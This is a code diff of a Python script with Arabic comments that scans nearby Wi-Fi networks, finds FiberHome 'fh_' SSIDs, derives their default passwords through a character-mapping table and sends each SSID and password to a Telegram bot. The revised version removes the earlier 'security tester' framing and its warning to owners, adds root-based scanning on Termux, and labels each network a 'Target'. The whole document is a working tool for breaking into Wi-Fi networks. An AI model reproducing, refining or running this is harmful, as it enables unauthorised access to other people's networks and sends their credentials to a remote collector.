@@ -1,101 +1,43 @@
-# -*- coding: utf-8 -*-
-import os
-import subprocess
-import requests
-import time
-import re
+import os, subprocess, time, urllib.request
 
-# ============================================================
-# [إعدادات التلجرام - ضع بياناتك هنا]
-# ============================================================
-BOT_TOKEN = "ضع_التوكن_هنا"
-CHAT_ID = "ضع_الايدي_هنا"
+# --- ضع بياناتك هنا ---
+TOKEN = "YOUR_BOT_TOKEN"
+CHAT_ID = "YOUR_CHAT_ID"
 
-# ============================================================
-# [جدول التبديل الخاص بمودمات FiberHome في الجزائر]
-# بناءً على الصورة التي أرفقتها (wlan + التحويل)
-# ============================================================
-MAPPING = {
-    'e': '1', 'd': '2', '3': 'c', 'b': '4',
-    'a': '5', '9': '6', '8': '7', 'f': '0'
-}
+# جدول التحويل (Mapping)
+MAP = {'e':'1','d':'2','c':'3','b':'4','a':'5','9':'6','8':'7','f':'0'}
 
-def send_telegram(msg):
-    """إرسال النتيجة إلى هاتفك عبر تلجرام"""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"}
+def send_tg(t):
     try:
-        requests.post(url, data=payload)
-    except:
-        pass
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={t}"
+        urllib.request.urlopen(url)
+    except: pass
 
-def predict_fh_password(ssid):
-    """تطبيق الخوارزمية: تحويل ما بعد fh_ وإضافة بادئة wlan"""
-    target = ssid.lower()
-    if "fh_" in target:
-        # استخراج الجزء الذي يلي fh_
-        parts = target.split("fh_")
-        suffix = parts[1]
-        
-        # عملية التبديل بناءً على الجدول
-        transformed = ""
-        for char in suffix:
-            transformed += MAPPING.get(char, char)
-            
-        return f"wlan{transformed}"
+def get_p(s):
+    if "fh_" in s.lower():
+        sub = s.split("fh_")[-1]
+        res = "".join([MAP.get(c.lower(), c) for c in sub])
+        return f"wlan{res}"
     return None
 
-def scan_wifi_networks():
-    """مسح الشبكات القريبة باستخدام أداة nmcli (نظام لينكس)"""
-    networks = []
-    try:
-        # تنفيذ أمر المسح وجلب الأسماء (SSID)
-        result = subprocess.check_output("nmcli -t -f SSID device wifi list", shell=True).decode("utf-8")
-        for line in result.split('\n'):
-            if line.strip():
-                networks.append(line.strip())
-    except Exception as e:
-        print(f"[-] Error Scanning: {e}")
-    return list(set(networks)) # إزالة التكرار
-
 def main():
-    print("--------------------------------------------------")
-    print("   FiberHome (FH) Security Tester - Algeria       ")
-    print("   Coded for: Moha (Security Lab)                 ")
-    print("--------------------------------------------------")
-    
-    # قائمة لتتبع الشبكات التي تم فحصها وإرسالها لتجنب التكرار
-    history = []
-    
+    os.system("clear")
+    print("\033[1;32m   MOHA-WIFI TOOL (TERMUX) \n   -----------------------")
+    hist = []
     while True:
-        print("\n[*] Scanning for nearby networks...")
-        ssids = scan_wifi_networks()
-        
-        for name in ssids:
-            if "fh_" in name.lower() and name not in history:
-                print(f"[!] Detected Target: {name}")
-                predicted_pass = predict_fh_password(name)
-                
-                if predicted_pass:
-                    # تحضير الرسالة
-                    log_msg = (
-                        "🔴 *FH Security Alert*\n\n"
-                        f"📡 *SSID:* `{name}`\n"
-                        f"🔑 *Suggested Pass:* `{predicted_pass}`\n\n"
-                        "⚠️ *Note:* If this is your network, please change the password immediately!"
-                    )
-                    
-                    # الإرسال لتلجرام والطباعة في الشاشة
-                    print(f"[+] Predicted Password: {predicted_pass}")
-                    send_telegram(log_msg)
-                    history.append(name)
-        
-        # الانتظار لمدة 30 ثانية قبل المسح التالي
-        time.sleep(30)
+        try:
+            # مسح الشبكات (يحتاج روت ليعمل تلقائياً)
+            out = subprocess.check_output("su -c 'iwlist wlan0 scan | grep ESSID'", shell=True).decode()
+            for line in out.split('\n'):
+                if "ESSID" in line:
+                    name = line.split('"')[1]
+                    if "fh_" in name.lower() and name not in hist:
+                        pw = get_p(name)
+                        print(f"[+] Found: {name} -> {pw}")
+                        send_tg(f"🚀 Target: {name}%0A🔑 Pass: {pw}")
+                        hist.append(name)
+        except: pass
+        time.sleep(10)
 
 if __name__ == "__main__":
-    # تنبيه قبل التشغيل
-    if BOT_TOKEN == "ضع_التوكن_هنا":
-        print("[!] Warning: Please set your Telegram Token/ID first.")
-    
     main()
